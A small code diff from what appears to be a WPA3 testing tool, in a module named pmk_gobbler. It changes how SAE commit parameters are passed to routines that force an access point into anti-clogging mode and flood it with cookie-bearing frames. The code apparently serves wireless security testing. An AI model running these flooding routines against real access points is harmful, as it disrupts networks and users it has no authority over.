@@ -197,13 +197,13 @@ namespace wpa3_tester::pmk_gobbler {
 
         const auto ssid = rs.config.at("actors").at("access_point") //TODO should be iin setup_actor
             .at("setup").at("program_config").at("ssid").get<string>();
-        const dos_helpers::SAEPair sae_params = cookie_guzzler::get_commit_values(
+        const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
             rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
         attacker->set_monitor_mode();
         attacker->up_iface();
 
         //  force AP into ACM mode
-        ACMCookie first = trigger_acm(iface, attacker["mac"], ap_mac, trigger_count, sae_params);
+        ACMCookie first = trigger_acm(iface, attacker["mac"], ap_mac, trigger_count, sae_params.value());
         rs.start_observers();
         CookieStore store;
         thread capture_thread([&]() {
@@ -216,7 +216,7 @@ namespace wpa3_tester::pmk_gobbler {
         });
 
         try {
-            burst_with_cookies(sniff_iface, attacker["mac"] , ap_mac, store, attack_time, sae_params);
+            burst_with_cookies(sniff_iface, attacker["mac"] , ap_mac, store, attack_time, sae_params.value());
         } catch (...) {
             store.stop.store(true);
             if (capture_thread.joinable()) capture_thread.join();
